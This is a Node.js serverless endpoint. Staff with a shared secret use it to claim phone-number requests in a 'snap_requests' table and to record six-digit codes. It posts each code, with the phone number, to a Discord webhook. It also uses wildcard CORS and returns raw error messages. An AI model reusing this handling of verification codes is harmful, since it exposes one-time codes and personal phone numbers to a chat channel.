import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'POST') return res.status(405).json({ success: false });

  try {
    const { action, phone, code, secret } = req.body;

    // Sécurité basique — change ce secret !
    if (secret !== process.env.STAFF_SECRET) {
      return res.status(401).json({ success: false, message: 'Unauthorized' });
    }

    const sql = neon(process.env.DATABASE_URL);

    if (action === 'claim') {
      await sql`UPDATE snap_requests SET status = 'processing' WHERE phone = ${phone}`;
      return res.status(200).json({ success: true, message: 'Prise en charge confirmée' });
    }

    if (action === 'send_code') {
      if (!code || !/^\d{6}$/.test(code)) {
        return res.status(400).json({ success: false, message: 'Code 6 chiffres requis' });
      }
      await sql`UPDATE snap_requests SET status = 'waiting_code', staff_code = ${code} WHERE phone = ${phone}`;

      // Notifier Discord
      if (process.env.DISCORD_WEBHOOK_URL) {
        try {
          await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `📩 **Code envoyé** au numéro \`${phone}\` — Code: ||${code}||`
            })
          });
        } catch (e) {}
      }

      return res.status(200).json({ success: true, message: 'Code enregistré' });
    }

    return res.status(400).json({ success: false, message: 'Action inconnue' });
  } catch (e) {
    return res.status(500).json({ success: false, message: e.message });
  }
}